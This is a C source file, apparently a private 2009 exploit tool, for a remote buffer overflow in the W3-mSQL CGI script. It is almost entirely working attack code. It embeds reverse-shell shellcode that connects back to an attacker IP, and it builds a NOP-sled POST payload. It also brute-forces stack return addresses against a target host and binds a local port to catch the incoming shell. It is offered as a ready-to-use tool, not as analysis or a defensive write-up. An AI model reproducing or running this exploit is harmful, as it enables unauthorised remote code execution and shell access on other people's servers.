/*
 * 0DAY PROOF OF CONCEPT W3-MSQL/CGI REMOTE BUFFEROVERFLOW EXPLOIT
 *
 * by skylazart
 * 06/Jan/2009
 *
 * Thanks destruct_ / BufferOverflow
 *
 * PRIVATE, DO NOT DISTRIBUTE!!!
 */



#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdarg.h>
#include <signal.h>

#include "net.h"


#define DEFAULT_INITIAL_RETURN_ADDRESS 0xbfffffff
#define DEFAULT_RETRY_OFFSET -6144
#define DEFAULT_REMOTE_PORT 80


/* Returning to musashi */
unsigned char scode[] =
	/* Fork() if (eax != 0) exit (0) */
	"\x31\xc0"                   /* xor    %eax,%eax       */
	"\x66\x40"                   /* inc    %ax	       */
	"\x66\x40"                   /* inc    %ax	       */
	"\xcd\x80"                   /* int    $0x80	       */
	"\x85\xc0"                   /* test   %eax,%eax       */
	"\x74\x08"                   /* je     80483a8 <child> */
	"\x31\xc0"                   /* xor    %eax,%eax       */
	"\x31\xdb"                   /* xor    %ebx,%ebx       */
	"\x66\x40"                   /* inc    %ax	       */
	"\xcd\x80"                   /* int    $0x80           */ 
	/* Connect back shellcode filtering some illegal bytes for scanf () */
	/* by metasploit */
	"\x29\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x47"
	"\x40\xbe\x30\x83\xeb\xfc\xe2\xf4\x76\x9b\xed\x73\x14\x2a\xbc\x5a"
	"\x21\x18\x37\xd1\x8a\xc0\x2d\x69\xf7\x7f\x73\xb0\x0e\x39\x47\x6b"
	"\x1d\x28\xff\x23\xf5\x45\xd8\x58\x48\x5d\xfd\x56\x14\xc9\x5f\x80"
	"\x21\x10\xef\x63\xce\xa1\xfd\xfd\xc7\x12\xd6\x1f\x68\x33\xd6\x58"
	"\x68\x22\xd7\x5e\xce\xa3\xec\x63\xce\xa1\x0e\x3b\x8a\xc0\xbe\x30";


/* Returning to 192.168.1.100 */
unsigned char b[] =
	/* Fork() if (eax != 0) exit (0) */
	"\x31\xc0"                   /* xor    %eax,%eax       */
	"\x66\x40"                   /* inc    %ax	       */
	"\x66\x40"                   /* inc    %ax	       */
	"\xcd\x80"                   /* int    $0x80	       */
	"\x85\xc0"                   /* test   %eax,%eax       */
	"\x74\x08"                   /* je     80483a8 <child> */
	"\x31\xc0"                   /* xor    %eax,%eax       */
	"\x31\xdb"                   /* xor    %ebx,%ebx       */
	"\x66\x40"                   /* inc    %ax	       */
	"\xcd\x80"                   /* int    $0x80           */ 

	/* Connect back shellcode filtering some illegal bytes for scanf () */
	/* by metasploit  */
	"\x2b\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x70"
	"\x96\x31\xbe\x83\xeb\xfc\xe2\xf4\x41\x4d\x62\xfd\x23\xfc\x33\xd4"
	"\x16\xce\xb8\x5f\xbd\x16\xa2\xe7\xc0\xa9\xfc\x3e\x39\xef\xc8\xe5"
	"\x2a\xfe\xf1\x16\x71\xf2\x57\xd6\x7f\x8b\x72\xd8\x23\x1f\xd0\x0e"
	"\x16\xc6\x60\xed\xf9\x77\x72\x73\xf0\xc4\x59\x91\x5f\xe5\x59\xd6"
	"\x5f\xf4\x58\xd0\xf9\x75\x63\xed\xf9\x77\x81\xb5\xbd\x16\x31\xbe";


typedef enum {RESULT_SUCCESS, RESULT_FAILURE} result_t;



/* FUNCTIONS DECLARATION */
void help (char * progname);
void show_progress_status (const char *fmt, ...);
void show_progress_result (result_t result);
int check_host (char * host, int remote_port, char * url_path);
void setup_signal (void);
void handle_ctrl_c (int signum);
int verify_connect_back_shell (int serverfd);
int exploit_w3msql (char * host, int remote_port, char * url_path, unsigned int return_address, int aligment, char * connect_back_ip_address);
int SendBigBuffer (int sockfd, char * buffer, int totlen);


int quite = 0;


void
help (char * progname)
{
	printf ("Usage:\n"
		"\t%s -t <host> -u <url_path> -i <connect_back_ip_address>\n"
		"\n"
		"Optional parameters:\n"
		"\t-r <initial_return_addr> DEFAULT 0x%08x\n"
		"\t-o <retry_offset>        DEFAULT %d\n"
		"\t-p <remote_port>         DEFAULT %d\n"
		"\t-h Show this help\n\n", progname, DEFAULT_INITIAL_RETURN_ADDRESS, DEFAULT_RETRY_OFFSET, DEFAULT_REMOTE_PORT);

	printf ("Optionally, you can use CONNECT_BACK_IP enviroment var instead of -i opt.\n\n");
}

void
show_progress_status (const char *fmt, ...)
{
	static int step = 0;
	va_list ap;

	va_start (ap, fmt);

	printf ("STEP [%d] - ", ++step);
	vprintf (fmt, ap);
	printf (" ... ");

	fflush (stdout);	
}

void
show_progress_result (result_t result)
{
	

	if (result == RESULT_SUCCESS)
		printf ("SUCCESS.\n");

	if (result == RESULT_FAILURE)
		printf ("FAILED!\n");
	
}

#define RESULT_BUFFER_SIZE 65535
int
check_host (char * host, int remote_port, char * url_path)
{
	int sockfd;
	int n;
	char request[256];
	char response[1024];

	char * resultBuffer;
	int tot_result_Buffer;
	
	sockfd = net_tcp_nonblock_connect (host, remote_port, 60);
	if (sockfd <= 0) {
		close (sockfd);
		return (-1);
	}

 	snprintf (request, sizeof (request),
		  "GET %s HTTP/1.0\r\n"
		  "Host: %s\r\n\r\n", url_path, host);

	
	n = write (sockfd, request, strlen (request));

	if (n <= 0) {
		close (sockfd);
		return (-1);
	}

	memset (response, 0, sizeof (response));
	resultBuffer = malloc (RESULT_BUFFER_SIZE);

	tot_result_Buffer = 0;

	while (net_has_data (sockfd, 6)) {		
		n = read (sockfd, response, sizeof (response));
		if (n <= 0) {
			break;
		}

		if (tot_result_Buffer + n > RESULT_BUFFER_SIZE)
			break;

		tot_result_Buffer += n;
		
		response[n] = 0;		
		strncat (resultBuffer, response, RESULT_BUFFER_SIZE-2);
	}

	close (sockfd);

	if (strstr (resultBuffer, "W3-mSQL Error") != NULL) {
		free (resultBuffer);
		return (-1);
	}


	free (resultBuffer);
	return (1);
}

int 
verify_connect_back_shell (int serverfd)
{
	struct timeval tv;
	fd_set rfds;
	int result;

	tv.tv_sec = 0;
	tv.tv_usec = 100;

	FD_ZERO (&rfds);
	FD_SET (serverfd, &rfds);
	
	result = select (serverfd + 1, &rfds, NULL, NULL, &tv);
	if (result <= 0)
		return (-1);

	return (1);
}

int
SendBigBuffer (int sockfd, char * buffer, int totlen)
{
	struct timeval tv;
	fd_set wfds;

	char * ptr;
	int n;

	int totoutlen = 0;
	int missing_bytes = totlen;

	missing_bytes = totlen;

	ptr = buffer;


	printf ("sending bytes ");
	fflush (stdout);

	do {
		FD_ZERO (&wfds);
		FD_SET (sockfd, &wfds);
		tv.tv_usec = 0;
		tv.tv_sec = 2;

		if (select (sockfd + 1, NULL, &wfds, NULL, &tv)) {
			n = write (sockfd, ptr, missing_bytes);
			if (n <= 0) {
				break;
			}
		       

			
			totoutlen += n;
			missing_bytes -= n;

			printf ("%d/%d - ", totoutlen, totlen);
			fflush (stdout);

			if (missing_bytes == 0)
				break;
			
			continue;
		}

		break;
	} while (1);
	
	return (totoutlen);
}


#define POST_BUFFER_SIZE 32+128+(17*1024)+512
#define TOT_OF_NOPS 10 * 1024
int 
exploit_w3msql (char * host, int remote_port, char * url_path, unsigned int return_address, int aligment, char * connect_back_ip_address)
{
	char http_header_data[256];
	char * post_buffer;
	char * response_buffer;
	char * ptr;
	char * eptr;

	int evil_code_len;
	int n;

	int sockfd;

	sockfd = net_tcp_nonblock_connect (host, remote_port, 6);
	if (sockfd < 0) {
		close (sockfd);
		return (-1);
	}

	post_buffer = malloc (POST_BUFFER_SIZE+1);
	if (post_buffer == NULL) {
		close (sockfd);
		return (-1);
	}


	ptr = post_buffer;
	eptr = ptr + (POST_BUFFER_SIZE-1);

	*eptr = 0;
	
	memset (ptr, 0x90, TOT_OF_NOPS + aligment);
	ptr += TOT_OF_NOPS + aligment;

	memcpy (ptr, scode, sizeof (scode));
	ptr += sizeof (scode);

	ptr--;

	while (ptr < eptr - 5) {
		*(long *)ptr = return_address;
		ptr += 4;
	}

	evil_code_len = ptr - post_buffer;

	// Used only for connect_back shellcode
	ptr = strstr (post_buffer, "IPIP");
	if (ptr) {
		*(long *)ptr = inet_addr (connect_back_ip_address);
	}



	snprintf (http_header_data, sizeof (http_header_data), 
		  "POST %s HTTP/1.0\r\n"
		  "Host:%s\r\n"
		  "Content-Type: multipart/form-data\r\n"
		  "Content-Length: %d\r\n"
		  "\r\n", 
		  url_path, host, evil_code_len);

	n = write (sockfd, http_header_data, strlen (http_header_data));
	if (n <= 0) {
		printf ("Erro\n");
		close (sockfd);
		free (post_buffer);
		return (-1);
	}


	n = SendBigBuffer (sockfd, post_buffer, evil_code_len);
	if (n <= 0) {
		close (sockfd);
		free (post_buffer);
		return (-1);
	}
	

	// XXX DEBUG
	if (!quite) {
		n = SendBigBuffer (2, post_buffer, evil_code_len);
	}
	
	n = write (sockfd, "\r\n", 2);

	free (post_buffer);

	response_buffer = malloc (1024);

	while (net_has_data (sockfd, 6)) {		
		n = read (sockfd, response_buffer, 1022);

		if (n <= 0) 
			break;

		response_buffer[n] = 0;

		if (!quite)
			printf ("%s\n", response_buffer);
	}
	
	close (sockfd);
	free (response_buffer);
	
	return (1);
}


#define MISSING(s) \
	printf ("ERROR: You must specify \"%s\".\n\n", s);
int
main (int argc, char ** argv)
{
	char * host;
	char * url_path;
	int remote_port;

	char * connect_back_ip_address;

	unsigned int initial_return_address;
	
	int retry_offset;
	int return_address;
	int alignment;

	int opt;

	int serverfd;


	// Default values
	initial_return_address = DEFAULT_INITIAL_RETURN_ADDRESS;
	retry_offset = DEFAULT_RETRY_OFFSET;
	remote_port = DEFAULT_REMOTE_PORT;
	connect_back_ip_address = getenv ("CONNECT_BACK_IP");
	alignment = 0;

	host = NULL;
	url_path = NULL;


	printf ("\n"
		"REMOTE 0DAY BUFFEROVERFLOW EXPLOIT FOR W3-MSQL CGI SCRIPT\n"
		"by skylazart / BufferOverflow\n"
		"06/Jan/2009\n"
		"\n"
		"Thanks to destruct_ / BufferOverflow\n\n\n");

		
	while ((opt = getopt (argc, argv, "t:u:r:o:p:i:h")) != -1) {
		switch (opt) {
		case 't':
			host = optarg;
			break;
		case 'u':
			url_path = optarg;
			break;
		case 'r':
			initial_return_address = strtoul (optarg, NULL, 16);
			break;
		case 'o':
			retry_offset = atoi (optarg);
			break;
		case 'p':
			remote_port = atoi (optarg);
			break;
		case 'i':
			connect_back_ip_address = optarg;
			break;
		case 'h':
			help (argv[0]);
			exit (1);
		}
	}

	if (connect_back_ip_address == NULL) {
		MISSING ("connect_back_ip_address");
		help (argv[0]);
		exit (1);
	}
	
	if (host == NULL) {
		MISSING ("host");
		help (argv[0]);
		exit (1);
	}

	if (url_path == NULL) {
		MISSING ("url_path");
		help (argv[0]);
		exit (1);
	}


	setup_signal ();

	show_progress_status ("Checking remote host http://%s:%d%s", host, remote_port, url_path);
	if (check_host (host, remote_port, url_path) == -1) {
		show_progress_result (RESULT_FAILURE);
		exit (1);
	}
	show_progress_result (RESULT_SUCCESS);

	show_progress_status ("Binding local port 3879");
	if ((serverfd = net_bind ("0.0.0.0", 3879)) == -1) {
		show_progress_result (RESULT_FAILURE);
		//exit (1);
	}
	show_progress_result (RESULT_SUCCESS);


	return_address = initial_return_address;
	
	//exploit_w3msql (host, remote_port, url_path, return_address, 0, connect_back_ip_address);
	//exploit_w3msql (host, remote_port, url_path, return_address, 1, connect_back_ip_address);
	//exploit_w3msql (host, remote_port, url_path, return_address, 2, connect_back_ip_address);
	//exploit_w3msql (host, remote_port, url_path, return_address, 3, connect_back_ip_address);

	//exit (0);

	

	// Starting brute force
	while (1) {

		if ((return_address & 0x000000ff)       == 0 ||
		    (return_address & 0x0000ff00) >> 8  == 0 ||
		    (return_address & 0x00ff0000) >> 16 == 0 ||
		    (return_address & 0xff000000) >> 24 == 0) {

			// Skip this address
			if (retry_offset > 0)
				return_address += 1;
			else
				return_address -= 1;

			continue;
		}

		for (alignment = 0; alignment < 4; alignment++) {
			show_progress_status ("Brute forcing address 0x%08x aligment %d", return_address, alignment);
			
			
			if (exploit_w3msql (host, remote_port, url_path, return_address, alignment, connect_back_ip_address) == -1) {
				printf ("WTF???\n");
			}			


			//if (verify_connect_back_shell (serverfd) == 1) {
			//	show_progress_result (RESULT_SUCCESS);
			//	break;
			//}

			show_progress_result (RESULT_FAILURE);
		}
		
		return_address += retry_offset;
	}

	
	//accept_shell (serverfd);
	
	close (serverfd);


	exit (0);
	
}


void 
setup_signal (void)
{
	signal (SIGPIPE, SIG_IGN);
	signal (SIGINT, handle_ctrl_c);
	signal (SIGHUP, SIG_IGN);
}

void
handle_ctrl_c (int signum)
{
	printf ("ABORTED!!\n");
	exit (1);
}
